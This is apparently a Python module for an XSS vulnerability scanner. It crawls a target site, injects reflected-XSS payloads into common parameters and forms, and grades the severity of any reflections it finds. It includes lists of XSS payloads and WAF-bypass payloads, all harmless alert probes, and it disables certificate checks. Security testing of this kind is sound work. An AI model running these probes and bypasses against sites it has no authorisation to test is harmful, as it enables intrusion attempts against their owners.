# checker/xss.py — XSSChecker v2
import re
import threading
import requests
import urllib3
from typing import Dict, Any, Optional, List
from urllib.parse import urljoin, quote, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from helpers.http_client import HttpClient
from helpers.waf_checker import WAFChecker
from helpers.spa_crawler import SPACrawler
from helpers.parsers import (
    extract_forms,
    extract_all_js_paths,
    normalize_url,
    spa_confidence,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Terminal output helpers ───────────────────────────────────────────────────

def _info(msg: str):  print(f"  [*] {msg}")
def _ok(msg: str):    print(f"  [+] {msg}")
def _warn(msg: str):  print(f"  [!] {msg}")
def _step(n: int, total: int, msg: str): print(f"\n  [{n}/{total}] {msg}")


# ── Constants ─────────────────────────────────────────────────────────────────

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept':     'text/html,application/xhtml+xml,*/*',
}

JSON_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept':     'application/json, */*',
    'X-Requested-With': 'XMLHttpRequest',
}

# CLOUDFLARE_SIGNATURES sudah dimigrasikan ke helpers/waf_checker.py


# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_MARKER = 'DEEPSCANXSS7x9z'

XSS_PAYLOADS = [
    f'<script>alert("{XSS_MARKER}")</script>',
    f'"><script>alert("{XSS_MARKER}")</script>',
    f"'><script>alert('{XSS_MARKER}')</script>",
    f'<img src=x onerror=alert("{XSS_MARKER}")>',
    f'"><img src=x onerror=alert("{XSS_MARKER}")>',
    f'<svg onload=alert("{XSS_MARKER}")>',
    f'<body onload=alert("{XSS_MARKER}")>',
    f'<ScRiPt>alert("{XSS_MARKER}")</ScRiPt>',
    f'<img src=x onerror=alert`{XSS_MARKER}`>',
    f'<svg/onload=alert("{XSS_MARKER}")>',
    f'" onmouseover="alert(\'{XSS_MARKER}\')" x="',
    f"' onmouseover='alert(\"{XSS_MARKER}\")' x='",
    f'</script><script>alert("{XSS_MARKER}")</script>',
    f'javascript:alert("{XSS_MARKER}")',
]

WAF_BYPASS_PAYLOADS = [
    f'%3Cscript%3Ealert%28%22{XSS_MARKER}%22%29%3C%2Fscript%3E',
    f'<scr%00ipt>alert("{XSS_MARKER}")</scr%00ipt>',
    f'<img src=x onerror=&#97;lert("{XSS_MARKER}")>',
    # Tambahan WAF bypass payloads
    f'<svg/onload=alert("{XSS_MARKER}")>',
    f'<details/open/ontoggle=alert("{XSS_MARKER}")>',
    f'<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert("{XSS_MARKER}")>',
    f'<img src=x onerror="eval(atob(\'YWxlcnQo\'))" />',
    f'<iframe src="javascript:alert(`{XSS_MARKER}`)" />',
    f'<input onfocus=alert("{XSS_MARKER}") autofocus>',
    f'<marquee onstart=alert("{XSS_MARKER}")>',
    f'"><img/src=x onerror=alert("{XSS_MARKER}")>',
    f'"><svg/onload=confirm("{XSS_MARKER}")>',
]

TEST_ENDPOINTS = [
    '/search', '/q', '/find',
    '/comment', '/feedback', '/contact',
    '/profile', '/user', '/users',
    '/api/search', '/api/query', '/api/posts',
    '/api/comments', '/api/feedback',
    '/posts/search', '/',
]

TEST_PARAMS = [
    'q', 'search', 'query', 'keyword', 's',
    'name', 'message', 'comment', 'input',
    'text', 'value', 'title', 'content',
    'username', 'email', 'url', 'redirect',
]


# ── Severity ──────────────────────────────────────────────────────────────────

SEVERITY_VULN_KEY: dict[str, str] = {
    'CRITICAL': 'XSS_CRITICAL',
    'HIGH':     'XSS_HIGH',
    'MEDIUM':   'XSS_MEDIUM',
    'LOW':      'XSS_LOW',
}

# Parameter sensitif yang langsung eksekusi di browser → CRITICAL
_CRITICAL_PARAMS = {'redirect', 'url', 'next', 'return', 'callback', 'target'}

# Path auth-sensitive → naikkan ke CRITICAL
_AUTH_PATHS = {'login', 'signin', 'auth', 'oauth', 'register', 'admin', 'account'}

# Payload berbahaya tinggi (script/event handler langsung) → HIGH
_HIGH_PAYLOAD_MARKERS = {'<script', '<svg', '<body', '<img', 'onerror', 'onload'}


def _classify_severity(url: str, param: str, payload: str, method: str) -> str:
    parsed_path = urlparse(url).path.lower()
    is_auth     = any(kw in parsed_path for kw in _AUTH_PATHS)
    is_critical_param = param.lower() in _CRITICAL_PARAMS
    payload_lower     = payload.lower()

    # Redirect/open-redirect param + XSS → CRITICAL
    if is_critical_param:
        return 'CRITICAL'

    # Auth endpoint + XSS → CRITICAL
    if is_auth:
        return 'CRITICAL'

    # Script injection atau event handler langsung → HIGH
    if any(marker in payload_lower for marker in _HIGH_PAYLOAD_MARKERS):
        return 'HIGH'

    # Attribute injection atau JS context → MEDIUM
    return 'MEDIUM'


# ── Main class ────────────────────────────────────────────────────────────────

class XSSChecker:
    def __init__(
        self,
        url: str,
        timeout: float = 8.0,
        cookies: Optional[Dict] = None,
        extra_paths: Optional[List[str]] = None,
        scope_mode: str = 'wildcard',
    ):
        self.base_url    = url.rstrip('/')
        self.timeout     = int(timeout)
        self.cookies     = cookies or {}
        self.extra_paths = extra_paths or []
        self.scope_mode  = scope_mode
        self._lock       = threading.Lock()
        self._vuln_found = threading.Event()
        self._found_keys: set = set()
        self._waf_detected    = False
        self._waf_info: Dict  = {}
        self._api_bases: List = []

        self._client = HttpClient(
            timeout=self.timeout,
            headers=HEADERS,
            cookies=self.cookies,
            verify=False,
            retries=1,
        )

    # ── Utils ─────────────────────────────────────────────────────────────────

    def _is_cloudflare_page(self, text: str) -> bool:
        return WAFChecker.is_cloudflare_page(text)

    def _detect_waf(self) -> bool:
        waf = WAFChecker(self.base_url, self._client, HEADERS)
        detected = waf.detect()
        self._waf_info = waf.get_info()
        return detected

    def _is_reflected(self, body: str, payload: str, content_type: str = '') -> bool:
        if XSS_MARKER not in body:
            return False

        if 'application/json' in content_type:
            return False

        stripped = body.strip()
        if stripped.startswith(('{', '[')):
            json_pattern = re.compile(
                r'["\']([^"\']*' + re.escape(XSS_MARKER) + r'[^"\']*)["\']'
            )
            if json_pattern.search(body):
                return False

        encoded_variants = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;'),
            '&lt;script&gt;',
            '&amp;lt;',
            quote(payload),
        ]
        for enc in encoded_variants:
            if enc in body and payload not in body:
                return False

        return True

    def _extract_api_bases(self, js_text: str):
        for api_url in re.findall(
            r'["\`](https?://[a-zA-Z0-9._-]+/api(?:/[a-zA-Z0-9_/-]*)?)["\`]',
            js_text
        ):
            base = api_url.rstrip('/')
            if base not in self._api_bases:
                self._api_bases.append(base)

    # ── Endpoint discovery ────────────────────────────────────────────────────

    def _discover_endpoints(self) -> List[str]:
        active = []

        def probe(url: str):
            with self._lock:
                if url in active:
                    return
            try:
                r = self._client.get(url, headers=HEADERS)
                if not r or r.status_code in (404, 410):
                    return
                if self._is_cloudflare_page(r.text):
                    return
                with self._lock:
                    if url not in active:
                        active.append(url)
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=15) as ex:
            futures = [
                ex.submit(probe, urljoin(self.base_url, p))
                for p in TEST_ENDPOINTS
            ]
            for f in as_completed(futures):
                try: f.result()
                except Exception: pass

        r_main = self._client.get(self.base_url, headers=HEADERS)
        if r_main:
            for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', r_main.text):
                js_url = normalize_url(m.group(1), self.base_url)
                jr = self._client.get(js_url)
                if jr and jr.ok:
                    self._extract_api_bases(jr.text)
                    for path in extract_all_js_paths(jr.text):
                        full = normalize_url(path, self.base_url)
                        if full not in active:
                            active.append(full)

        for base in self._api_bases:
            for path in TEST_ENDPOINTS:
                url = f"{base.rstrip('/')}{path}"
                if url not in active:
                    try:
                        r = self._client.get(url, headers=JSON_HEADERS)
                        if r and r.status_code not in (404, 410) \
                                and not self._is_cloudflare_page(r.text):
                            active.append(url)
                            _ok(f"Endpoint API: {url}")
                    except Exception:
                        pass

        for path in self.extra_paths:
            full = normalize_url(path, self.base_url)
            if full not in active:
                active.append(full)

        return list(dict.fromkeys(active))

    # ── Core scan ─────────────────────────────────────────────────────────────

    def _scan_url_params(self, url: str, results: Dict):
        payloads = XSS_PAYLOADS + (WAF_BYPASS_PAYLOADS if self._waf_detected else [])

        for param in TEST_PARAMS:
            if self._vuln_found.is_set():
                return

            for payload in payloads:
                if self._vuln_found.is_set():
                    return

                with self._lock:
                    results['total_tested'] += 1

                test_url = f"{url}?{param}={quote(payload, safe='')}"
                try:
                    r = self._client.get(test_url, headers=HEADERS)
                    if not r or self._is_cloudflare_page(r.text):
                        continue

                    ct = r.headers.get('Content-Type', '').lower()
                    if 'application/json' in ct and 'text/html' not in ct:
                        if XSS_MARKER not in r.text:
                            continue

                    ct = r.headers.get('Content-Type', '').lower()
                    if self._is_reflected(r.text, payload, ct):
                        key = f"{url}:{param}"
                        registered = False
                        with self._lock:
                            if key not in self._found_keys:
                                self._found_keys.add(key)
                                registered = True

                        if registered:
                            # ── Tambahan: classify severity & vuln_key ────────
                            severity = _classify_severity(url, param, payload, 'GET')
                            parsed   = urlparse(url)

                            _warn(f"Reflected XSS [{severity}] → param={param} | {url}")
                            with self._lock:
                                results['vulnerable_paths'].append({
                                    'url':           test_url,
                                    'path':          parsed.path,
                                    'base':          f"{parsed.scheme}://{parsed.netloc}",
                                    'param':         param,
                                    'payload':       payload,
                                    'type':          'Reflected XSS',
                                    'method':        'GET',
                                    'severity':      severity,
                                    'vuln_key':      SEVERITY_VULN_KEY.get(severity),
                                    'file_count':    0,
                                    'dir_count':     0,
                                    'notable_files': [],
                                    'is_nested':     False,
                                })
                            self._vuln_found.set()
                        return

                except Exception:
                    pass

    def _scan_forms(self, results: Dict):
        if self._vuln_found.is_set():
            return

        r_main = self._client.get(self.base_url, headers=HEADERS)
        if not r_main or not r_main.ok or self._is_cloudflare_page(r_main.text):
            return

        forms = extract_forms(r_main.text, self.base_url)
        if not forms:
            return

        _info(f"Ditemukan {len(forms)} form, testing XSS ...")

        for form in forms:
            if self._vuln_found.is_set():
                break
            for inp in form['inputs']:
                if self._vuln_found.is_set():
                    break
                param  = inp['name']
                action = form['action']

                for payload in XSS_PAYLOADS[:6]:
                    if self._vuln_found.is_set():
                        break
                    with self._lock:
                        results['total_tested'] += 1

                    try:
                        if form['method'] == 'post':
                            r = self._client.post(
                                action,
                                data={param: payload},
                                headers=HEADERS
                            )
                        else:
                            r = self._client.get(
                                f"{action}?{param}={quote(payload, safe='')}",
                                headers=HEADERS
                            )

                        if not r or self._is_cloudflare_page(r.text):
                            continue

                        if self._is_reflected(r.text, payload):
                            key = f"form:{action}:{param}"
                            registered = False
                            with self._lock:
                                if key not in self._found_keys:
                                    self._found_keys.add(key)
                                    registered = True

                            if registered:
                                method = form['method'].upper()
                                # ── Tambahan: classify severity & vuln_key ────
                                severity = _classify_severity(action, param, payload, method)
                                parsed   = urlparse(action)
                                vuln_url = (f"{action}?{param}={payload}"
                                            if form['method'] == 'get' else action)

                                _warn(f"Reflected XSS (form {method}) [{severity}] → "
                                      f"param={param} | {action}")
                                with self._lock:
                                    results['vulnerable_paths'].append({
                                        'url':           vuln_url,
                                        'path':          parsed.path,
                                        'base':          f"{parsed.scheme}://{parsed.netloc}",
                                        'param':         param,
                                        'payload':       payload,
                                        'type':          'Reflected XSS',
                                        'method':        method,
                                        'severity':      severity,
                                        'vuln_key':      SEVERITY_VULN_KEY.get(severity),
                                        'file_count':    0,
                                        'dir_count':     0,
                                        'notable_files': [],
                                        'is_nested':     False,
                                    })
                                self._vuln_found.set()
                            break

                    except Exception:
                        pass

    # ── Main run ──────────────────────────────────────────────────────────────

    def run(self) -> Dict[str, Any]:
        results = {
            'vulnerable':       False,
            'vulnerable_paths': [],        
            'total_tested':     0,
            'findings':         [],
            'error':            None,
            'summary':          {},        
            'waf_detected':     False,
        }

        try:
            self._waf_detected      = self._detect_waf()
            results['waf_detected'] = self._waf_detected
            results['waf_info']     = self._waf_info
            waf_name   = self._waf_info.get('waf_name', '?')
            waf_status = f"terdeteksi ({waf_name})" if self._waf_detected else "tidak terdeteksi"
            pw_status  = "tersedia" if SPACrawler.is_available() else "tidak tersedia"
            _info(f"WAF: {waf_status} | Playwright: {pw_status}")

            _step(1, 3, "Mengumpulkan endpoint ...")
            endpoints = self._discover_endpoints()
            if self._api_bases:
                _info(f"External API: {', '.join(self._api_bases)}")
            _info(f"Total {len(endpoints)} endpoint aktif")

            _step(2, 3, f"Reflected XSS scan ({len(endpoints)} endpoint) ...")
            with ThreadPoolExecutor(max_workers=5) as ex:
                futures = [
                    ex.submit(self._scan_url_params, url, results)
                    for url in endpoints
                ]
                for f in as_completed(futures):
                    if self._vuln_found.is_set():
                        for remaining in futures:
                            remaining.cancel()
                        break
                    try: f.result()
                    except Exception: pass

            _step(3, 3, "Form XSS scan ...")
            self._scan_forms(results)

            # ── Finalize + summary ────────────────────────────────────────────
            if results['vulnerable_paths']:
                results['vulnerable'] = True
                count = len(results['vulnerable_paths'])

                sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
                type_count: Dict[str, int] = {}
                for vp in results['vulnerable_paths']:
                    sev = vp.get('severity', 'MEDIUM')
                    sev_count[sev] = sev_count.get(sev, 0) + 1
                    t = vp.get('type', 'unknown')
                    type_count[t] = type_count.get(t, 0) + 1

                results['summary'] = {
                    'total_vulnerable_paths': count,
                    'severity_breakdown':     {k: v for k, v in sev_count.items() if v > 0},
                    'type_breakdown':         type_count,
                    'waf_detected':           results['waf_detected'],
                }

                results['findings'].append(
                    f"Reflected XSS ditemukan pada {count} parameter."
                )
                for v in results['vulnerable_paths']:
                    results['findings'].append(
                        f"  → [{v['type']}][{v.get('severity','?')}] [{v['method']}] "
                        f"{v['url']} (param: {v['param']})"
                    )
                _ok(
                    f"Total: {count} XSS | "
                    f"CRITICAL={sev_count.get('CRITICAL',0)} "
                    f"HIGH={sev_count.get('HIGH',0)} "
                    f"MEDIUM={sev_count.get('MEDIUM',0)}"
                )
            else:
                results['findings'].append(
                    "Tidak ditemukan indikasi Reflected XSS."
                )

        except Exception as e:
            results['error'] = str(e)
        finally:
            self._client.close()

        return results